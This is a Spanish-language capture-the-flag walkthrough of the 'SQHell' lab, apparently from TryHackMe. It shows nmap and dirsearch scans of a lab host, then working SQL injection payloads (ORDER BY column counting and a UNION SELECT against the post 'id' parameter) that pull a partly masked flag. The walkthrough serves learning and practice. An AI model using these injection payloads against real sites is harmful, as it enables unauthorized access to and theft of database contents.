@@ -1,1 +1,73 @@
 #SQHell walkthrough.
+#Los cambios de IP víctima en esta máquina se deben a que la voy a ir completando en varios dias.
+
+Comienzo con un escaneo de puertos.
+
+sudo nmap -p- 10.129.142.95
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-31 12:47 CEST
+Nmap scan report for 10.129.142.95
+Host is up (0.029s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
+
+Se que es un CTF de SQLInjection, no voy a enumerar más.
+
+Tras probar un par de comandos de sqlmap, no encuentro nada.
+Enumero un poco más a ver si me estoy perdiendo algo.
+
+sudo dirsearch -u http://10.129.142.95
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/mksk/reports/http_10.129.142.95/_26-07-31_13-05-06.txt
+
+Target: http://10.129.142.95/
+
+[13:05:06] Starting: 
+[13:05:20] 200 -    2KB - /login
+[13:05:20] 200 -    2KB - /login/
+[13:05:24] 200 -   21B  - /post
+[13:05:25] 200 -    3KB - /register
+[13:05:29] 200 -   21B  - /user
+[13:05:30] 200 -   21B  - /user/
+
+Me estaba perdiendo algo. 
+En /user y /post sale el mismo error.
+
+Missing parameter: id
+
+Pruebo a ponerle un id.
+
+http://10.129.142.95/post?id=1
+
+Continúo con ORDER BY (NUMERO) para averiguar el número de columnas.
+
+http://10.129.142.95/post?id=1%20ORDER%20BY%205--
+
+Al llegar a 5 me salta el siguiente error. 
+Unknown column '5' in 'order clause'
+
+Ya se que son 4 columnas.
+
+Tengo una pista en el enunciado del CTF.
+Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.
+
+Listo la la flag con la siguiente consulta.
+
+http://10.129.142.95/post?id=-1 UNION SELECT flag,2,3,4 FROM flag--
+
+Al llegar a la segunda consulta consigo la flag.
+http://10.129.142.95/post?id=-1%20UNION%20SELECT%201,flag,3,4%20FROM%20flag--
+
+THM{FLAG5:*********************C8}
+
+Esta es la quinta, he comenzado por el final.
